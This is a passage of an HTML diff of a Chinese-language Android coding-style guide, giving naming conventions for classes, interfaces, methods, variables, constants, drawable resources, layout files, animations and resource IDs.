+<p align="left"><span style="color:#464646; background:#F8F8F8">activity</span><span style="color:#464646; background:#F8F8F8">&nbsp;</span><span style="color:#464646; background:#F8F8F8">类</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;Aty</span><span style="color:#464646; background:#F8F8F8">或者</span><span style="color:#464646; background:#F8F8F8">Activity</span><span style="color:#464646; background:#F8F8F8">为后缀标识</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;欢迎页面类</span><span style="color:#464646; background:#F8F8F8">WelcomeAty.</span><span style="color:#464646; background:#F8F8F8">或者</span><span style="color:#464646; background:#F8F8F8">WelcomeActivity</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">Adapter</span><span style="color:#464646; background:#F8F8F8">类</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;&nbsp;</span>Adp<span style="color:#464646; background:#F8F8F8">或者</span><span style="color:#464646; background:#F8F8F8">Adapte&nbsp;</span><span style="color:#464646; background:#F8F8F8">为后缀标识</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;新闻详情适配器</span><span style="color:#464646; background:#F8F8F8">NewtDetailAdp</span><span style="color:#464646; background:#F8F8F8">或则直接</span><span style="color:#464646; background:#F8F8F8"> &nbsp;&nbsp;NewDetailAdapter</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">解析类</span><span style="color:#464646; background:#F8F8F8">&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70)">&nbsp;</span><span style="color:#464646; background:#F8F8F8">Hlr</span><span style="color:#464646; background:#F8F8F8">为后缀标识</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;首页解析类</span><span style="color:#464646; background:#F8F8F8">HomePosterHlr</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">公共方法类</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70)">&nbsp;&nbsp;</span><span style="color:#464646; background:#F8F8F8">Tools</span><span style="color:#464646; background:#F8F8F8">或</span><span style="color:#464646; background:#F8F8F8">Manager</span><span style="color:#464646; background:#F8F8F8">为后缀标识</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;线程池管理类：</span><span style="color:#464646; background:#F8F8F8">ThreadPoolManager</span><span style="color:rgb(70,70,70)"><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color:rgb(70,70,70)">&nbsp;</span><span style="color:#464646; background:#F8F8F8">日志工具类：</span><span style="color:#464646; background:#F8F8F8">LogTools</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">数据库类</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;以</span><span style="color:#464646; background:#F8F8F8">DBHelper</span><span style="color:#464646; background:#F8F8F8">后缀标识</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;新闻数据库：</span><span style="color:#464646; background:#F8F8F8">NewDBHelper</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">Service</span><span style="color:#464646; background:#F8F8F8">类</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;以</span><span style="color:#464646; background:#F8F8F8">Service</span><span style="color:#464646; background:#F8F8F8">为后缀标识</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">&nbsp;时间服务</span><span style="color:#333333">Time</span><span style="color:#464646; background:#F8F8F8">Service</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">BroadcastReceive</span><span style="color:#464646; background:#F8F8F8">类</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp; 以</span><span style="color:#464646; background:#F8F8F8">Broadcast</span><span style="color:#464646; background:#F8F8F8">为后缀标识</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">&nbsp;时间通知</span><span style="color:#333333">Time</span><span style="color:#464646; background:#F8F8F8">Broadcast</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">ContentProvider&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70)">&nbsp;</span><span style="color:#464646; background:#F8F8F8">以</span><span style="color:#464646; background:#F8F8F8">Provider</span><span style="color:#464646; background:#F8F8F8">为后缀标识</span></p>
+</td>
+<td>
+<p align="left">&nbsp;</p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70)">直接写的共享基础类</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70)">&nbsp;以</span><span style="color:rgb(70,70,70)">Base</span><span style="color:rgb(70,70,70)">开头</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70)">BaseActivity,BaseFragment</span></p>
+</td>
+</tr>
+</tbody>
+</table>
+<br>
+<span style="color:#464646"><span style="background:#F8F8F8">3 &nbsp;</span></span><span style="color:#464646; background:#F8F8F8">接口（</span><span style="color:#464646; background:#F8F8F8">interface</span><span style="color:#464646; background:#F8F8F8">）：命名规则与类一样采用大驼峰命名法，多以</span><span style="color:#464646; background:#F8F8F8">able</span><span style="color:#464646; background:#F8F8F8">或</span><span style="color:#464646; background:#F8F8F8">ible</span><span style="color:#464646; background:#F8F8F8">结尾，如</span><span style="color:#464646; background:#F8F8F8">interface
+ Runn</span><span style="color:green; background:#F8F8F8">a</span><span style="color:#464646">&nbsp;</span><span style="color:green; background:#F8F8F8">ble</span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">;</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">interface Access</span><span style="color:green; background:#F8F8F8">ible</span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">。</span><span style="color:#464646"><br>
+<br>
+<span style="background:#F8F8F8">4 &nbsp;</span></span><span style="color:#464646; background:#F8F8F8">方法（</span><span style="color:#464646; background:#F8F8F8">methods</span><span style="color:#464646; background:#F8F8F8">）：动词或动名词，采用小驼峰命名法</span><span style="color:#464646; background:#F8F8F8">例如</span><span style="color:#464646; background:#F8F8F8">:onCreate(),run()<br>
+</span><span style="color:#464646"><br>
+</span>
+<table border="1" cellspacing="0" cellpadding="0" width="616">
+<tbody>
+<tr>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">方法</span></strong></p>
+</td>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">说明</span></strong></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">initXX()</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70)">&nbsp;</span><span style="color:#464646; background:#F8F8F8">初始化相关方法</span><span style="color:#464646; background:#F8F8F8">,</span><span style="color:#464646; background:#F8F8F8">使用</span><span style="color:#464646; background:#F8F8F8">init</span><span style="color:#464646; background:#F8F8F8">为前缀标识，如初始化布局initView()</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">isXX()</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70)">&nbsp;</span><span style="color:#464646; background:#F8F8F8">checkXX()</span><span style="color:#464646; background:#F8F8F8">方法返回&#20540;为</span><span style="color:#464646; background:#F8F8F8">boolean</span><span style="color:#464646; background:#F8F8F8">型的请使用</span><span style="color:#464646; background:#F8F8F8">is</span><span style="color:#464646; background:#F8F8F8">或</span><span style="color:#464646; background:#F8F8F8">check</span><span style="color:#464646; background:#F8F8F8">为前缀标识</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">getXX()</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;返回某个&#20540;的方法，使用</span><span style="color:#464646; background:#F8F8F8">get</span><span style="color:#464646; background:#F8F8F8">为前缀标识</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">processXX()</span><span style="color:#464646; background:#F8F8F8">&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;对数据进行处理的方法，尽量使用</span><span style="color:#464646; background:#F8F8F8">process</span><span style="color:#464646; background:#F8F8F8">为前缀标识</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">displayXX()</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;弹出提示框和提示信息，使用</span><span style="color:#464646; background:#F8F8F8">display</span><span style="color:#464646; background:#F8F8F8">为前缀标识</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">saveXX()</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70)">&nbsp;</span><span style="color:#464646; background:#F8F8F8">与保存数据相关的，使用</span><span style="color:#464646; background:#F8F8F8">sav</span><span style="color:#464646; background:#F8F8F8">为</span><span style="color:#464646; background:#F8F8F8">e</span><span style="color:#464646; background:#F8F8F8">前缀标识</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">resetXX()</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70)">&nbsp;</span><span style="color:#464646; background:#F8F8F8">对数据重组的，使用</span><span style="color:#464646; background:#F8F8F8">reset</span><span style="color:#464646; background:#F8F8F8">前缀标识</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">clearXX()</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;清除数据相关的</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">removeXXX()&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;清除数据相关的</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">drawXXX()</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;绘制数据或效果相关的，使用</span><span style="color:#464646; background:#F8F8F8">draw</span><span style="color:#464646; background:#F8F8F8">前缀标识</span></p>
+</td>
+</tr>
+</tbody>
+</table>
+<br>
+<br>
+<span style="background:#F8F8F8">5 &nbsp;</span><span style="color:#464646; background:#F8F8F8">变量（</span><span style="color:#464646; background:#F8F8F8">variables</span><span style="color:#464646; background:#F8F8F8">）采用小驼峰命名法。类中控件名称必须与</span><span style="color:#464646; background:#F8F8F8">xml</span><span style="color:#464646; background:#F8F8F8">布局</span><span style="color:#464646; background:#F8F8F8">id</span><span style="color:#464646; background:#F8F8F8">保持一致。</span><span style="color:#464646"><br>
+<br>
+</span><span style="color:#464646; background:#F8F8F8">用统一的量词通过在结尾处放置一个量词，就可创建更加统一的变量，它们更容易理解，也更容易搜索。例如，请使用</span><span style="color:#464646; background:#F8F8F8">strCustomerFirst</span><span style="color:#464646; background:#F8F8F8">和</span><span style="color:#464646; background:#F8F8F8">strCustomerLast</span><span style="color:#464646; background:#F8F8F8">，而不要使用</span><span style="color:#464646; background:#F8F8F8">strFirstCustomer</span><span style="color:#464646; background:#F8F8F8">和</span><span style="color:#464646; background:#F8F8F8">strLastCustomer</span><span style="color:#464646; background:#F8F8F8">。</span><span style="color:#464646"><br>
+</span><span style="color:#464646; background:#F8F8F8">量词列表：量词后缀说明</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">First&nbsp;</span></span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">一组变量中的第一个</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">Last&nbsp;&nbsp;</span></span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">一组变量中的最后一个</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">Next&nbsp;&nbsp;</span></span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">一组变量中的下一个变量</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">Prev&nbsp;&nbsp;</span></span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">一组变量中的上一个</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">Cur&nbsp;&nbsp;&nbsp;</span></span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">一组变量中的当前变量</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">&nbsp;</span><br>
+<span style="background:#F8F8F8">6 &nbsp;</span></span><span style="color:#464646; background:#F8F8F8">常量（</span><span style="color:#464646; background:#F8F8F8">Constants</span><span style="color:#464646; background:#F8F8F8">）全部大写</span><span style="color:#464646; background:#F8F8F8">,</span><span style="color:#464646; background:#F8F8F8">采用下划线命名法</span><span style="color:#464646; background:#F8F8F8">.</span><span style="color:#464646; background:#F8F8F8">例如：</span><span style="color:#464646; background:#F8F8F8">MIN_WIDTH</span><span style="color:#464646"><br>
+<br>
+</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">7 &nbsp;</span></span><span style="color:#464646; background:#F8F8F8">资源文件（图片drawable文件夹下）：</span><span style="color:#464646; background:#F8F8F8">全部小写，采用下划线命名法，加前缀区分</span></p>
+<p align="left"><span style="color:#464646; background:#F8F8F8"></span></p>
+<p align="left"><span style="color:rgb(51,51,51)">命名模式：</span><span style="color:rgb(51,51,51)">activity</span><span style="color:rgb(51,51,51)">名称</span><span style="color:rgb(51,51,51)">_</span><span style="color:rgb(51,51,51)">逻辑名称</span><span style="color:rgb(51,51,51)">/common_</span><span style="color:rgb(51,51,51)">逻辑名称</span></p>
+<p align="left"><span style="color:rgb(51,51,51)"><span style="color:rgb(51,51,51)">如果有多种形态如按钮等除外如</span><strong><span style="color:rgb(51,51,51)"><span style="color:rgb(70,70,70); background-color:rgb(248,248,248)">btn_xx.</span>xml</span><span style="color:rgb(51,51,51)">（</span><span style="color:rgb(51,51,51)">selector</span><span style="color:rgb(51,51,51)">）</span></strong><br>
+</span></p>
+<table border="1" cellspacing="0" cellpadding="0" width="493">
+<tbody>
+<tr>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">名称</span></strong></p>
+</td>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">功能</span></strong></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">btn_xx</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">&nbsp;按钮图片使用btn_整体效果<span style="color:rgb(51,51,51)"><strong>（</strong></span><span style="color:rgb(51,51,51)"><strong>selector</strong></span><span style="color:rgb(51,51,51)"><strong>）</strong></span></span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">btn_xx_normal</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">&nbsp;按钮图片使用btn_正常情况效果</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">btn_xx_press</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">&nbsp;按钮图片使用btn_点击时候效果</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">bg_head</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">&nbsp;背景图片使用bg_功能_说明</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">def_search_cell</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">&nbsp;默认图片使用def_功能_说明</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">icon_more_help</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">&nbsp;图标图片使用icon_功能_说明</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">seg_list_line</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">&nbsp;具有分隔特征的图片使用seg_功能_说明</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">sel_ok</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)">&nbsp;选择图标使用sel_功能_说明</span></p>
+</td>
+</tr>
+</tbody>
+</table>
+<p align="left"><span style="color:#464646">命名后缀：</span></p>
+<p align="left"><span style="color:#464646"></span>
+<table border="1" cellspacing="0" cellpadding="0" align="left" width="604">
+<tbody>
+<tr>
+<td style="background-color:rgb(79,129,189)">
+<p align="left"><strong><span style="color:white">后缀</span></strong></p>
+</td>
+<td style="background-color:rgb(79,129,189)">
+<p align="left"><strong><span style="color:white">说明</span></strong></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">unit</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)"><span style="color:rgb(51,51,51)">&nbsp;在使用</span><span style="color:rgb(51,51,51)">xml</span><span style="color:rgb(51,51,51)">的</span><span style="color:rgb(51,51,51)">tilemode</span><span style="color:rgb(51,51,51)">来配图片时，</span><span style="color:rgb(51,51,51)">element</span><span style="color:rgb(51,51,51)">图片使用此后缀</span></span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">nor</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">&nbsp;图片的状态，代表普通状态</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">hl</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">&nbsp;图片的状态，代表高亮状态</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">press</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">&nbsp;图片的状态，代表按下状态</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">select</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)"><span style="color:rgb(51,51,51)">&nbsp;图片的状态，代表其所占的</span><span style="color:rgb(51,51,51)">view</span><span style="color:rgb(51,51,51)">被选中</span></span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">unselect</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)"><span style="color:rgb(51,51,51)">&nbsp;图片的状态，代表其所占的</span><span style="color:rgb(51,51,51)">view</span><span style="color:rgb(51,51,51)">没有被选中</span></span></p>
+</td>
+</tr>
+</tbody>
+</table>
+</p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;</span></p>
+<p align="left"><strong><span style="color:rgb(51,51,51)">&nbsp;</span></strong></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;</span></p>
+<br>
+<p><span style="color:rgb(70,70,70); background-color:rgb(248,248,248)">8&nbsp;</span><span style="color:rgb(70,70,70)">&nbsp;</span><span style="color:rgb(70,70,70); background-color:rgb(248,248,248)">&nbsp;&nbsp;</span><span style="color:rgb(70,70,70)">&nbsp;</span><span style="color:rgb(70,70,70); background-color:rgb(248,248,248)">资源布局文件</span>（XML文件（layout布局文件））：</p>
+<p></p>
+<p align="left">&nbsp;全部小写，采用下划线命名法</p>
+<p></p>
+<p align="left"><span style="color:rgb(51,51,51)">1)</span><span style="color:rgb(51,51,51)">．</span><span style="color:rgb(51,51,51)">contentview</span><span style="color:rgb(51,51,51)">命名,&nbsp;<span style="color:rgb(70,70,70); background-color:rgb(248,248,248)">Activity</span><span style="color:rgb(70,70,70); background-color:rgb(248,248,248)">默认布局，以去掉后缀的</span><span style="color:rgb(70,70,70); background-color:rgb(248,248,248)">Activity</span><span style="color:rgb(70,70,70); background-color:rgb(248,248,248)">类进行命名。不加后缀</span>：</span></p>
+<p align="left"><span style="color:rgb(51,51,51)"></span></p>
+<p align="left" style="color:rgb(70,70,70)"><strong><span style="color:rgb(51,51,51)"><span style="color:rgb(51,51,51)">&nbsp; &nbsp; &nbsp; &nbsp;</span>功能模块.xml<br>
+</span></strong></p>
+<p align="left" style="color:rgb(70,70,70)"><span style="font-weight:bold"><span style="color:rgb(51,51,51)">&nbsp; &nbsp; &nbsp; &nbsp;例如：<span style="color:rgb(70,70,70)"><span style="color:rgb(51,51,51)">main.xml</span><span style="color:rgb(51,51,51)">、</span><span style="color:rgb(51,51,51)">more.xml、settings.xml</span></span></span></span></p>
+&nbsp; &nbsp; &nbsp; &nbsp; 或则：activity_<span style="color:rgb(51,51,51)">功能模块</span><span style="color:rgb(51,51,51)">.xml</span>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp; &nbsp; &nbsp; &nbsp; 例如：</span><strong><span style="color:rgb(51,51,51)">activity_main.xml</span><span style="color:rgb(51,51,51)">、</span><span style="color:rgb(51,51,51)">activity_more.xml</span></strong></p>
+<p align="left"><span style="color:rgb(51,51,51)">2)</span><span style="color:rgb(51,51,51)">．</span><span style="color:rgb(51,51,51)">Dialog</span><span style="color:rgb(51,51,51)">命名：</span><span style="color:rgb(51,51,51)">dialog_</span><span style="color:rgb(51,51,51)">描述</span><span style="color:rgb(51,51,51)">.xml</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color:rgb(51,51,51)">例如：</span><strong><span style="color:rgb(51,51,51)">dlg_hint.xml</span></strong></p>
+<p align="left"><span style="color:rgb(51,51,51)">2)</span><span style="color:rgb(51,51,51)">．</span><span style="color:rgb(51,51,51)">PopupWindow</span><span style="color:rgb(51,51,51)">命名：</span><span style="color:rgb(51,51,51)">ppw_</span><span style="color:rgb(51,51,51)">描述</span><span style="color:rgb(51,51,51)">.xml</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color:rgb(51,51,51)">例如：</span><strong><span style="color:rgb(51,51,51)">ppw _info.xml</span></strong></p>
+<p align="left"><span style="color:rgb(51,51,51)">3).&nbsp;</span><span style="color:rgb(51,51,51)">列表项命名</span><span style="color:rgb(51,51,51)">listitem_</span><span style="color:rgb(51,51,51)">描述</span><span style="color:rgb(51,51,51)">.xml</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color:rgb(51,51,51)">例如：</span><strong><span style="color:rgb(51,51,51)">listitem_city.xml</span></strong></p>
+<p align="left"><span style="color:rgb(51,51,51)">4)</span><span style="color:rgb(51,51,51)">．包含项：</span><span style="color:rgb(51,51,51)">include_</span><span style="color:rgb(51,51,51)">模块</span><span style="color:rgb(51,51,51)">.xml</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color:rgb(51,51,51)">例如：</span><strong><span style="color:rgb(51,51,51)">include_head.xml</span><span style="color:rgb(51,51,51)">、</span><span style="color:rgb(51,51,51)">include_bottom.xml</span></strong></p>
+<p align="left"><span style="font-weight:bold"><span style="color:rgb(51,51,51)"></span></span></p>
+<p align="left" style="color:rgb(70,70,70)"><span style="color:rgb(51,51,51)">5)</span><span style="color:rgb(51,51,51)">．adapter的子布局：</span><span style="color:rgb(51,51,51)"><span style="color:rgb(51,51,51)"><strong>功能模块</strong></span>_</span><span style="color:rgb(51,51,51)">item</span><span style="color:rgb(51,51,51)">.xml</span></p>
+<p align="left" style="color:rgb(70,70,70)"><span style="color:rgb(51,51,51)">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color:rgb(51,51,51)">例如：</span><strong><span style="color:rgb(51,51,51)">main_item.xml</span><span style="color:rgb(51,51,51)">、</span></strong></p>
+<p align="left"><span style="color:#464646"><br>
+</span></p>
+<p align="left"><span style="color:#464646">9</span><span style="color:#464646">&nbsp;</span><span style="color:#464646">&nbsp;</span><span style="color:#464646">&nbsp;</span><span style="color:#464646">动画文件（anim文件夹下</span>）：全部小写，采用下划线命名法，加前缀区分。</p>
+<p align="left"><span style="color:#464646">&nbsp;</span></p>
+<p>//前面为动画的类型，后面为方向</p>
+<p>
+<table border="1" cellspacing="0" cellpadding="0" width="481">
+<tbody>
+<tr>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">动画命名例子</span></strong></p>
+</td>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">规范写法</span></strong></p>
+</td>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">备注</span></strong></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left">fade_in</p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">淡入</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">&nbsp;</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left">fade_out</p>
+</td>
+<td>
+<p align="left">淡出</p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">&nbsp;</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left">push_down_in</p>
+</td>
+<td>
+<p align="left">从下方推入</p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">&nbsp;</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left">push_down_out</p>
+</td>
+<td>
+<p align="left">从下方推出</p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">&nbsp;</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left">push_left</p>
+</td>
+<td>
+<p align="left">推像左方</p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">&nbsp;</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left">slide_in_from_top</p>
+</td>
+<td>
+<p align="left">从头部滑动进入</p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">&nbsp;</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left">zoom_enter</p>
+</td>
+<td>
+<p align="left">变形进入</p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">&nbsp;</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left">slide_in</p>
+</td>
+<td>
+<p align="left">滑动进入</p>
+</td>
+<td>
+<p align="left">&nbsp;</p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left">shrink_to_middle</p>
+</td>
+<td>
+<p align="left">中间缩小</p>
+</td>
+<td>
+<p align="left">&nbsp;</p>
+</td>
+</tr>
+</tbody>
+</table>
+</p>
+<p></p>
+<p><br>
+</p>
+<p><span style="color:#464646; background:#F8F8F8">10&nbsp;</span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">&nbsp;&nbsp;</span><span style="color:#464646; background:#F8F8F8">资源ID</span>（resourcesid）：大小写规范与方法名一致，采用小驼峰命名法。命名规范为“资源控件的缩写&nbsp;<span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">名”&#43;</span>“变量名”。注意：<strong><span style="color:red; background:#F8F8F8">页面控件名称应该和控件id</span>名保持一致</strong></p>
+<p><strong><span style="color:red; background:#F8F8F8">&nbsp;<span style="color:rgb(51,51,51)">strings.xml，colors.xml等</span><span style="color:rgb(51,51,51)">中的</span><span style="color:rgb(51,51,51)">id</span><span style="color:rgb(51,51,51)">命名：</span></span></strong></p>
+<p><span style="font-weight:bold"><span style="color:red; background:#F8F8F8"><span style="color:rgb(51,51,51)"></span></span></span></p>
